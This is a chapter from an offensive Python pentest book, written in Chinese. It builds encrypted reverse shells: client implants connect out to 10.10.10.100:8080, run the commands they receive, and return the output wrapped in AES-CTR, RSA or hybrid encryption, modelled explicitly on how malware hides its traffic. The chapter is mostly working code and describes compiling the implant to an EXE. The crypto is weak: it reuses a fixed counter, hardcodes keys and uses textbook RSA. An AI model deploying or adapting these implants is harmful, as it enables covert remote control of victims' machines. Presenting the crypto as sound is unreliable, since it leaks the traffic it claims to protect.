# 第六章：恶意软件对加密技术的滥用

在本章中，我们将使用比简单的 XOR 更坚固的方式来保护我们的隧道，因为现代恶意软件使用一种知名的加密算法来保护其在传输路径中的流量。

本章涵盖的主题如下：

+   加密算法简介

+   使用 AES 保护你的隧道—流模式

+   使用 RSA 保护你的隧道

+   混合加密密钥

# 加密算法简介

在本节中，我们将简要概述加密领域中最常见的加密算法。基本上，有两种类型的加密算法：第一种叫做**对称加密**，第二种叫做**非对称加密**。这种分类是根据所需密钥的数量以及它们的操作方式来进行的。我们将稍微讨论一下这些算法之间的区别，首先从对称加密开始。

现在，对称加密使用一个密钥来进行加密和解密，这个密钥在客户端和服务器端共享。最常见的对称加密算法有 AES、Blowfish、RC4 和 Triple DES。在非对称加密中，我们有密钥对的概念，其中一个叫做**公钥**，用于加密，而另一个叫做**私钥**，用于解密。密钥的名称暗示了公钥可以在不可信的网络（如互联网）上发布，这样做不会造成任何损害。另一方面，私钥绝不能离开操作系统或旨在解密数据的机器。如果私钥泄露出操作系统，那么任何拥有该私钥的人都可以解密流量。

客户端或目标必须生成自己的密钥对，服务器或攻击者则需要生成自己的密钥。现在，在双方各自生成密钥对后，操作流程如下：客户端将持有自己的私钥和服务器的公钥；另一方面，服务器将持有自己的私钥和客户端的公钥。简要回顾一下，切换后，在 Kali 一侧我们拥有自己的私钥和目标的公钥。同样，在目标一侧，我们拥有自己的私钥，并且也持有 Kali 的公钥。因此，在我们的 shell 中反映这一点，当我们得到一个反向 shell 提示并输入要执行的命令时，例如`ipconfig`，它将使用客户端的公钥进行加密，并通过隧道发送。

当我们在终端提示符中输入`ipconfig`时，在将`ipconfig`明文发送之前，我们将使用目标的公钥对该消息进行加密，并通过隧道发送出去。不管谁在监视这段流量，只有客户端可以解密它，因为只有客户端持有私钥。我们将使用目标的私钥解密命令，并将其恢复为明文，这就是`ipconfig`命令。现在，当客户端执行`ipconfig`时，输出不会以明文形式发送，而是使用服务器或 Kali 公钥进行加密，并通过隧道发送出去。现在，在 Kali 一侧，一旦我们收到加密的消息，我们将将其交给我们的私钥，私钥将用于解密流量或解密消息并以明文形式打印出来。最后，我需要提到的关于非对称加密的内容是这个算法的最常见示例，即 RSA 和**Pretty Good Privacy**（**PGP**）。

两种方法各有其优缺点。非对称算法被认为比对称算法更难破解，更坚固、更安全。然而，它需要更多的处理过程，比对称算法慢得多。那么，问题是，我们能否创建一个混合系统或混合算法，利用对称和非对称系统的优点？答案是肯定的。

我们将使用非对称算法安全地传输一个随机且复杂的密钥。这个密钥稍后将用于使用对称算法加密我们的传输数据。所以，基本上，事情是这样的。Kali 机器将持有目标的公钥，然后我们将在 Kali 侧生成对称密钥。现在，我们将利用目标侧的非对称公钥，并使用它来加密生成的对称密钥，并将其发送到目标侧。目标将使用其私钥解密对称密钥。

我们将使用目标的私钥来导出或解密对称密钥。因此，到这个步骤，我们可以使用这个对称密钥来进行隧道加密。现在，一旦我们安全地传输了对称密钥，我们就可以用它来加密通过这个隧道传输的每个命令或输出。简单回顾一下，一旦目标端启动与我们 Kali 侧的会话，我们将生成对称密钥。为了安全地传输这个对称密钥，我们将使用目标的公钥加密它，并发送过去。在目标端，我们将解密该消息并再次提取对称密钥。到此为止，双方都拥有了对称密钥。现在，我们可以安全地通过对称密钥在双方之间传输命令。最后，我们要讨论的是使用混合方法的好处。首先，我们通过安全地传输生成的对称密钥来保持它的安全。其次，请记住，这是一个随机生成的密钥，每次连接时都会更改。我们不会在两端硬编码这个密钥，而是每次连接时密钥都会更改。此外，我们还可以随时更改密钥。例如，在 VPN IPSEC 协议中，你可以设置一个标准，在一定时间或消耗一定带宽后更换加密密钥。

# 使用 AES 加密保护你的隧道 – 流模式

在本节中，我们将使用 AES 加密来保护我们的 TCP 隧道。一般来说，AES 加密可以在两种模式下运行：**计数器（CTR）模式加密**（也称为**流模式**）和**密码块链接（CBC）模式加密**（也称为**块模式**）**。

# 密码块链接（CBC）模式加密

**块模式**意味着我们需要以数据块的形式发送数据：

![](img/00055.jpeg)

例如，如果我们说块大小为 512 字节，并且我们想发送 500 字节的数据，那么我们需要额外添加 12 字节的填充数据，以使总大小达到 512 字节。如果我们想发送 514 字节，那么前 512 字节将作为一个块发送，第二个块或下一个块将为 2 字节大小。然而，我们不能仅仅发送 2 字节，因为我们需要添加额外的 510 字节填充，以使第二个块的总大小为 512 字节。现在，在接收端，你需要通过去除填充并解密消息来逆向执行这些步骤。

# 计数器（CTR）模式加密

现在，让我们跳到另一种模式，也就是**计数器（CTR）模式加密**或**流模式**：

![](img/00056.jpeg)

在这种模式下，消息大小并不重要，因为我们不受块大小的限制，且我们将以流模式加密，就像 XOR 操作一样。现在，块模式在设计上被认为比流模式更强。在本节中，我们将实现流模式，剩下的块模式的实现将交给你自己去探索。

Python 中最著名的加密库叫做 `PyCrypto`。对于 Windows，它有一个编译好的二进制文件，对于 Kali 端，你只需要在下载库后运行安装文件。你可以从 [`www.voidspace.org.uk/python/modules.shtml#pycrypto`](http://www.voidspace.org.uk/python/modules.shtml#pycrypto) 下载这个库。所以，作为开始，我们将使用 `AES`，而不使用 TCP 或 HTTP 隧道：

```
# Python For Offensive PenTest

# Download Pycrypto for Windows - pycrypto 2.6 for win32 py 2.7
# http://www.voidspace.org.uk/python/modules.shtml#pycrypto

# Download Pycrypto source
# https://pypi.python.org/pypi/pycrypto
# For Kali, after extract the tar file, invoke "python setup.py install"

# AES Stream

import os
from Crypto.Cipher import AES

counter = os.urandom(16) #CTR counter string value with length of 16 bytes.
key = os.urandom(32) #AES keys may be 128 bits (16 bytes), 192 bits (24 bytes) or 256 bits (32 bytes) long.

# Instantiate a crypto object called enc
enc = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
encrypted = enc.encrypt("Hussam"*5)
print encrypted

# And a crypto object for decryption
dec = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
decrypted = dec.decrypt(encrypted)
print decrypted
```

代码非常简单。我们将首先导入 `os` 库，并从 `Crypto.Cipher` 库中导入 `AES` 类。现在，我们使用 `os` 库来创建随机的 `key` 和随机的 `counter`。计数器的长度是 `16` 字节，我们将为密钥大小选择 `32` 字节，以实现 AES-256。接下来，我们通过传递 `key`、AES 模式（这仍然是流模式或 CTR 模式）和 `counter` 值来创建加密对象。现在，请注意，`counter` 需要作为可调用对象发送。这就是我们使用 `lambda` 结构或 `lambda` 构造的原因，它是一种匿名函数，就像一个没有绑定名字的函数。解密过程与加密过程非常相似。所以，我们创建一个解密对象，然后传递加密消息，最后它会打印出解密后的消息，应该是明文的。

所以，让我们快速测试一下这个脚本并加密我的名字。一旦我们运行脚本，加密后的版本会显示在上面，下面的是解密后的版本，即明文：

```
>>>
]ox:|s
Hussam
>>>
```

所以，为了测试消息的大小，我将调用一个空格，并将我的名字的长度乘以`5`。这样，我们就得到了`5`倍的长度。明文的大小在这里并不重要。无论明文是什么，使用流模式时，我们都不会遇到任何问题。

现在，让我们将加密功能集成到我们的 TCP 反向 Shell 中。以下是客户端脚本：

```
# Python For Offensive PenTest# Download Pycrypto for Windows - pycrypto 2.6 for win32 py 2.7
# http://www.voidspace.org.uk/python/modules.shtml#pycrypto

# Download Pycrypto source
# https://pypi.python.org/pypi/pycrypto
# For Kali, after extract the tar file, invoke "python setup.py install"

# AES - Client - TCP Reverse Shell

import socket 
import subprocess 

from Crypto.Cipher import AES

counter = "H"*16
key = "H"*32

def encrypt(message):
    encrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    return encrypto.encrypt(message)

def decrypt(message):
    decrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    return decrypto.decrypt(message) 

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    s.connect(('10.10.10.100', 8080)) 

    while True: 
        command = decrypt(s.recv(1024))
        print ' We received: ' + command

...
```

我添加的是一个新的加密和解密函数，适用于双方，正如你所看到的，密钥和计数器值在两端都是硬编码的。我需要提到的一个旁注是，我们将在后面的混合加密中看到，如何从 Kali 机器生成一个随机值并安全地传输到我们的目标，但现在，暂时让我们将其硬编码在这里。

以下是服务器端脚本：

```
# Python For Offensive PenTest

# Download Pycrypto for Windows - pycrypto 2.6 for win32 py 2.7
# http://www.voidspace.org.uk/python/modules.shtml#pycrypto

# Download Pycrypto source
# https://pypi.python.org/pypi/pycrypto
# For Kali, after extract the tar file, invoke "python setup.py install"

# AES - Server- TCP Reverse Shell

import socket 
from Crypto.Cipher import AES

counter = "H"*16
key = "H"*32

...

def connect():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    s.bind(("10.10.10.100", 8080)) 
    s.listen(1) 
    print '[+] Listening for incoming TCP connection on port 8080'
    conn, addr = s.accept() 
    print '[+] We got a connection from: ', addr

...
```

它是这样工作的。在发送任何内容之前，我们会先将想要发送的内容传递给加密函数。当我们得到 Shell 提示符时，我们的输入会首先传递给加密函数；然后它会通过 TCP 套接字发送出去。现在，如果我们跳转到目标端，它几乎是镜像的。当我们接收到加密消息时，我们会首先将其传递给解密函数，解密函数会返回明文值。同时，在向 Kali 机器发送任何内容之前，我们会先加密它，就像在 Kali 端所做的那样。

现在，在两个端进行脚本运行。保持 Wireshark 在 Kali 端后台运行。我们从`ipconfig`开始。在目标端，我们将能够成功地将加密消息解密为明文。

现在，为了验证我们在传输路径中得到了加密，在 Wireshark 中，如果我们右键点击特定的 IP 并选择“Follow TCP Stream”，我们将看到消息在发送到 TCP 套接字之前已经被加密。

# 使用 RSA 保护你的隧道

在本节中，我们将使用 RSA 非对称算法来保护我们的隧道。现在，回顾非对称加密的要求：正如我们所说，每个实体都有自己的一对密钥；当我说密钥对时，我指的是公钥和私钥。最终的密钥对分配如下：客户端将持有自己的私钥和服务器的公钥。另一方面，服务器或 Kali 机器将持有自己的私钥和目标的公钥。因此，当我们想从 Kali 端向目标发送消息或命令时，首先我们将使用目标的公钥加密该消息，然后将其以加密格式通过隧道发送。目标将接收该命令或消息，并使用其私钥解密，从而恢复明文。执行完命令后，回复将使用服务器的公钥进行加密。之后，我们将以加密格式将其发送到网络，一旦我们在 Kali 机器上接收到该消息或加密消息，我们将使用 Kali 的私钥将其解密为明文。

现在，第一步是在两端生成一个密钥对：

```
# Python For Offensive PenTest

# Download Pycrypto for Windows - pycrypto 2.6 for win32 py 2.7
# http://www.voidspace.org.uk/python/modules.shtml#pycrypto

# Download Pycrypto source
# https://pypi.python.org/pypi/pycrypto
# For Kali, after extract the tar file, invoke "python setup.py install"

# Generate Keys

from Crypto.PublicKey import RSA 
new_key = RSA.generate(4096 ) # generate RSA key that 4096 bits long

#Export the Key in PEM format, the PEM extension contains ASCII encoding

public_key = new_key.publickey().exportKey("PEM") 
private_key = new_key.exportKey("PEM") 
print private_key
print public_key
```

所以，我们从导入`RSA`类开始。然后，我们创建一个新的对象来生成一个大小为`4096`位的密钥。现在，这是`RSA`支持的最大大小，但拥有一个复杂密钥所付出的代价就是其运行速度较慢。密钥越大，安全性越高，但操作会越慢。接下来，我们将密钥导出为`PEM`格式。`PyCrypto`支持其他格式，如`DER`，它是二进制编码。最常见的格式是`PEM`，它也用于网络设备，如防火墙和路由器，用于 VPN 或 HTTPS 访问目的。现在，打印出生成的密钥后，我们将其保存到`private.pem`和`public.pem`文件中。

让我们开始吧，运行之前提供的生成密钥脚本，分别在目标机器和攻击者机器上执行。在 Kali 机器上，我们会得到 RSA 私钥和公钥，密钥的开始和结束部分会被标记。我们在 Windows 机器上也会得到类似的结果。那么，现在我们要做的是，在 Kali 机器上复制每个密钥并保存到一个单独的文件中。首先从攻击者机器上的私钥开始，将私钥粘贴到记事本文件中。将此文件重命名为`private.pem`。现在，接下来做相同的操作，处理公钥。我们将它命名为`public.pem`。之后，切换到 Windows 机器，按照在 Kali 机器上做的操作进行。

现在，正如我们在 AES 加密中所做的那样，在将加密集成到我们的隧道中之前，首先让我们看看加密和解密是如何工作的：

```
# Python For Offensive PenTest

# Download Pycrypto for Windows - pycrypto 2.6 for win32 py 2.7
# http://www.voidspace.org.uk/python/modules.shtml#pycrypto

# Download Pycrypto source
# https://pypi.python.org/pypi/pycrypto
# For Kali, after extract the tar file, invoke "python setup.py install"from Crypto.PublicKey import RSA

# RSA ENC-DEC

from Crypto.PublicKey import RSA

def encrypt(message):
    publickey = open("public.pem", "r")
    encryptor = RSA.importKey(publickey)
    global encriptedData
    '''
The encrypt function, will take two arguments, the second one can be discarded
>>that's why we passed (message,0) arguments

The returned value is a tuple with two items. The first item is the
cipher text. The second item is always None.
>>that's why print encriptedData[0]

Ref: https://pythonhosted.org/pycrypto/Crypto.PublicKey.RSA._RSAobj-class.html#encrypt
    '''
    encriptedData=encryptor.encrypt(message,0)
    print encriptedData[0]

encrypt('Hussam')

def decrypt(cipher):
    privatekey = open("private.pem", "r")
    decryptor = RSA.importKey(privatekey)
    print decryptor.decrypt(cipher) 

decrypt(encriptedData)
```

在这里，我们首先定义一个加密函数，我们将传入我们想加密的消息，并在下面定义一个解密函数，就像我们在 AES 加密中做的一样。现在，在获取明文消息之后，我们将打开公钥文件，这个文件会为我们加密消息，并将导入的密钥链接到`encryptor`对象中。现在，`encryptor`对象将为我们执行实际的加密操作。

`RSA`类中的加密函数需要两个参数。第一个是明文消息，第二个参数可以简单地忽略。因此，我们传入了一个`0`值。另一个需要注意的是，加密的输出以元组格式返回。第一个元素包含加密后的文本，所以我们将打印出来，进行测试时——我先从加密我的名字开始。

让我们跳转到解密过程，我们将通过导入做类似于加密过程的操作。现在，这是关键的不同点。在解密时，我们将导入`privatekey`并传入`cipher`值，然后在解密后打印出明文。

让我们尝试在 Windows 机器上运行脚本，如果你遇到一个错误消息，提示我们没有找到`public.pem`文件或目录，很可能是因为保存的文件格式问题。查看完整的扩展名并去掉`.txt`，将其改为`.pem`，无论是公钥还是私钥文件都需要这样修改。

在这里，我们首先要加密我的名字，我们将以明文形式将我的名字传递给加密函数。现在，一旦我们导入了公钥进行加密，就会打印出加密后的消息。然后，我们将加密后的消息传回解密函数，以便我们可以以明文格式打印出来。

现在，如果我们切换到 Kali 机器并运行稍微修改过的`encrypt()`函数脚本：

```
...
encrypt('H'*512)
...
```

现在，注意到我已经在代码块中加密了一个大小为`512`字节的消息。我想展示的重点是，RSA 作为一个块`密码`类型在工作，并且根据`PyCrypto`的实现，块大小为`512`字节。

现在，让我们看看如果我将消息大小增加 1 字节会发生什么。所以下面我不会将其乘以 `512`，而是直接乘以 `513`。此时会抛出一个异常，提示明文数据过大，无法处理。

所以，消息的最大大小必须是 `512` 字节。现在，我要做的第一件事是将 RSA 集成到我们的 TCP 隧道中，然后我会展示如何通过几行 Python 代码解决块大小问题。现在，集成过程与我们在前面部分所做的非常相似。让我们来看一下客户端脚本：

```
# Python For Offensive PenTest

# Download Pycrypto for Windows - pycrypto 2.6 for win32 py 2.7
# http://www.voidspace.org.uk/python/modules.shtml#pycrypto

# Download Pycrypto source
# https://pypi.python.org/pypi/pycrypto
# For Kali, after extract the tar file, invoke "python setup.py install"

# RSA - Client - TCP Reverse Shell

import socket 
import subprocess 

from Crypto.PublicKey import RSA

def encrypt(message):
    #Remember that here we define the server's public key
    publickey ='''-----BEGIN PUBLIC KEY-----
...
-----END PUBLIC KEY-----'''

    encryptor = RSA.importKey(publickey)
    global encriptedData
    encriptedData=encryptor.encrypt(message, 0)
    return encriptedData[0]

def decrypt(cipher):
    #Remember that here we define our (the target's) private key
    privatekey = '''-----BEGIN RSA PRIVATE KEY-----
...
-----END RSA PRIVATE KEY-----'''

    decryptor = RSA.importKey(privatekey)
    dec = decryptor.decrypt(cipher) 
    return dec

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    s.connect(('10.10.10.100', 8080)) 

    while True:

        command = decrypt(s.recv(512))
        print ' We received: ' + command
...
```

所以，我创建了两个函数：一个用于加密，另一个用于解密。在发送任何命令之前，我们首先将其传递给加密函数，在打印任何结果之前，我们将得到的结果传递给解密函数。现在，请记住，目标端持有其私钥和服务器的公钥，而 Kali 机器持有其私钥和客户端的公钥。现在，去 Kali 机器，打开你之前保存在文本文件中的公钥。复制并粘贴公钥到变量中。所以，很显然，在将脚本导出为 EXE 格式之前，我们需要手动导入这些密钥。接下来，我们将打开刚才生成的目标端公钥。记住，这个公钥应该位于 Kali 机器上的公钥变量中。执行与之前相同的操作。

现在，是时候处理私钥了。因此，Kali 机器的私钥将位于该机器的脚本中。从文本文件中复制并粘贴私钥到服务器端和客户端的字符串中，并保存它们。现在，让我们看看集成到 TCP 隧道后的脚本是否能正常工作。启动 Wireshark，并在服务器端运行它。接着，我们跳到目标端，基本上我们得到了连接和一个 Shell 提示符。用一个不那么复杂的命令，比如 `whoami` 来检查连接。

现在，记住，`whoami` 的大小小于 `512` 字节；因此，我们能够成功地在 Kali 机器上加密它，并将其发送到目标端。而且，由于执行 `whoami` 的输出大小也小于 `512` 字节，我们成功收到了回复。所以，我们已经验证了加密功能在这里正常工作。现在，让我们尝试另一个命令，比如 `ipconfig`。

你会注意到我们已经成功接收到命令，但由于某些原因，在 Kali 机器上没有输出，这是因为在客户端或目标端执行 `ipconfig` 的输出超过了 `512` 字节，因此脚本会崩溃，因为我们超出了消息的大小限制。正如我之前所说，这可以通过验证消息长度并将其分解成多个块来解决，每个块应该小于或等于 `512` 字节。所以，让我们看一下最新的代码，它为我们解决了块大小的问题：

```
...     
 if len(result)>512:
                for i in range(0, len(result), 512):
                    chunk = result[0+i:512+i]
                    s.send( encrypt (chunk ) )

            else:
                s.send( encrypt (result ) ) 
...
```

我们创建了一个`if`语句来检查命令执行输出的大小。例如，假设我们从 Kali 得到的命令是`ipconfig`。那么，我们将检查 `ipconfig` 的输出是否大于 `512` 字节。如果没有，说明没有问题：我们将把输出发送到 `encrypt()` 函数，然后它会直接发送到 Kali 机器。不过，如果输出大于 `512` 字节，我们将其拆分成多个块，每个块的最大大小为 `512` 字节。拆分过程将通过一个 `for` 循环完成，我们从 `0` 开始，直到命令执行输出的长度。每次循环时，我们会将 `i` 计数器增加 `512` 字节。因此，通过这样做，我们将使得每个拆分的结果保存在块变量中，第一块将包含从 `0` 到 `512` 字节的结果，第二块将包含从 `500` 到 `1024` 字节的结果，以此类推，直到达到命令输出的长度。现在，注意到每次我们得到一个块后，我们就可以立即将其发送到攻击者机器，确保在发送之前已经通过加密函数处理过。

现在，在目标端，由于我们已经知道接收到的数据的最大大小是 `512` 字节，而不是再去读取 1 KB 并拆分成块，我们将每次读取一个块。因此，这就是为什么我们将接收值从 `1` KB 更改为 `512` 字节的原因。现在，在解密该块后，如果我们得到的明文消息的大小正好是 `512` 字节，这很可能意味着该消息已经在目标端被拆分成了块，对吧？那么，下一条消息或块与第一条相关联。这就是为什么存储的变量会保存这两条消息的原因，当我说这两条时，我指的是 `store + decrypt` 消息和接下来的 `store + decrypt` 消息。最后，我们将 `print` 出 `result`。

如果命令执行结果大于两条消息，或者换句话说，结果大于 1 KB，那么我们可能需要将第三条消息也与存储的变量关联起来。

那么，我们来验证一下代码现在是否有效。启动服务器端和客户端。首先运行之前失败的命令 `ipconfig`，我们会看到它的输出是一个完整的结果，即使它大于 `512` 字节。`whoami` 和目录命令也会得到类似的输出。

RSA 还被用于开发一种叫做 **勒索软件** 的东西。在勒索软件中，攻击者可以使用公钥加密目标文件，并要求支付费用以提供私钥，从而解密这些重要文件。

# 混合加密密钥

在这一点上，你应该能够编写代码并实现 RSA 非对称加密和 AES 对称加密，并将两者整合到我们的 TCP shell 中。那么现在，我们将实现一种混合方式，利用这两种算法。我们先快速回顾一下。客户端将持有自己的私钥，服务器或 Kali 机器将持有目标的公钥。一旦 TCP 连接建立，Kali 机器将生成一个随机的 AES 密钥，我们将安全地将这个密钥发送到目标端。我之所以说**安全地**，是因为传输将通过加密进行，或者通过使用目标的公钥加密随机的 AES 密钥。一旦目标收到该消息，它将使用目标的私钥进行解密，并将 AES 密钥还原为明文。此时，Kali 和目标机器都拥有相同的随机生成的 AES 密钥，这些密钥将用于 AES 加密。现在，此时的 AES 加密将用于加密我们将在 Kali 机器和目标之间来回传输的命令。

在每次新的连接时，Kali 和目标将重复整个过程，并且会派生出一个新的随机密钥。这就是为什么这叫做**混合方法**，因为我们使用非对称算法来安全地传输生成的对称密钥，最终将用来加密我们的命令。

所以，让我们跳到编码部分，这部分是对称和非对称的混合。以下是服务器端脚本：

```
# Python For Offensive PenTest

# Download Pycrypto for Windows - pycrypto 2.6 for win32 py 2.7
# http://www.voidspace.org.uk/python/modules.shtml#pycrypto

# Download Pycrypto source
# https://pypi.python.org/pypi/pycrypto
# For Kali, after extract the tar file, invoke "python setup.py install"

# Hybrid - Server- TCP Reverse Shell

import socket 
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES
import string
import random

def encrypt_AES_KEY(KEY):

    publickey ="""-----BEGIN PUBLIC KEY-----
...
-----END PUBLIC KEY-----"""

    encryptor = RSA.importKey(publickey)
    encriptedData=encryptor.encrypt(KEY, 0)
    return encriptedData[0]

```

完成 TCP 三次握手后，我们将生成两个随机值，即`key`和`counter`。它们的值是由大写字母、小写字母、数字和特殊字符的组合组成。在进入无限循环之前——该循环将用于传输我们希望执行的命令——我们将使用目标的公钥对这些值进行加密，然后传输：

```
...

def connect():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    s.bind(("10.10.10.100", 8080)) 
    s.listen(1)                                                        
    print '[+] Listening for incoming TCP connection on port 8080'
    conn, addr = s.accept() 
    print '[+] We got a connection from: ', addr
    global key
    key = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase + string.digits + '^!\$%&/()=?{[]}+~#-_.:,;<>|\\') for _ in range(32))
    print "Generated AES Key " + str(key)
    conn.send ( encrypt_AES_KEY(key) )
    global counter
    counter = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase + string.digits + '^!\$%&/()=?{[]}+~#-_.:,;<>|\\') for _ in range(16))
    conn.send ( encrypt_AES_KEY(counter) )
 ...
```

在目标端，并且在进入无限循环之前，我们将解密从 Kali 机器接收到的密钥和计数器；我们将使用我们的私钥进行加密。然后，我们将它们存储在一个全局变量中，这个变量将用于 AES 加密。同样，这个操作也会在进入无限循环之前完成。我们的私钥的定义在一个名为`GET_AES_KEY()`的函数中。所以，在此时，我们获得了密钥和`counter`值，正如我所说，我们将使用它们进行 AES 加密。因此，encrypt 函数和 decrypt 函数用于保护我们将在 Kali 和 Windows 机器之间来回传输的命令。现在，一旦我们进入无限循环，我们将使用 AES 的流模式来保护我们的隧道：

```
# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn https://jo.linkedin.com/in/python2

# Download Pycrypto for Windows - pycrypto 2.6 for win32 py 2.7
# http://www.voidspace.org.uk/python/modules.shtml#pycrypto

# Download Pycrypto source
# https://pypi.python.org/pypi/pycrypto
# For Kali, after extract the tar file, invoke "python setup.py install"

# Hybrid - Client - TCP Reverse Shell

import socket 
import subprocess 

from Crypto.PublicKey import RSA
from Crypto.Cipher import AES

def GET_AES_KEY(KEY):
    privatekey = """-----BEGIN RSA PRIVATE KEY-----
...
-----END RSA PRIVATE KEY-----"""

    decryptor = RSA.importKey(privatekey)
    AES_Key = decryptor.decrypt(KEY) 
    return AES_Key
...
def connect():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    s.connect(('10.10.10.100', 8080))
    global key, counter
    x = s.recv(1024)
    key = GET_AES_KEY( x )
    print "Generated AES Key " + str(key)
    y = s.recv(1024)
    counter = GET_AES_KEY( y )
     while True: 
        command = decrypt(s.recv(1024))
        print ' We received: ' + command

...
```

现在，让我们运行脚本，先从 Kali 端开始，然后是 Windows 端。你会注意到，一旦我们启动目标，Kali 机器上会生成一个随机的 AES 密钥，然后将其传输到目标端。

如果我们打开 Wireshark，右键点击任何一个 IP 地址并选择“Follow TCP Stream”，我们可以看到 AES 密钥在经过目标的公钥加密后成功传输。

因此，一旦我们获得密钥，所有发送的数据将会使用 AES 密钥流进行加密。所以，当我们在 Kali 机器上运行`ipconfig`并再次点击“Follow TCP Stream”时，`ipconfig`将会使用 AES 算法进行加密。

让我们尝试另一个命令，例如`whoami`。如果我们通过输入`terminate`停止此会话，然后重新建立一个新会话，你会看到根据新会话生成了一个新的随机 AES 密钥。

所以，每次目标连接到 Kali 机器时，都会生成一个新的随机密钥。

从技术角度讲，你可以在这里增强脚本，使两端在一定时间后或发送特定字节数后更换 AES 密钥，就像 VPN 隧道中的 IPSEC 所做的那样。

# 总结

在本章中，我们讨论了从加密算法介绍到不同类型算法的各种话题。我们还实现了 AES 和 RSA 来保护信息传输过程中的隧道。

到这里，我们已经走到了本书的结尾！希望你学到了很多可以用 Python 进行测试的技巧。
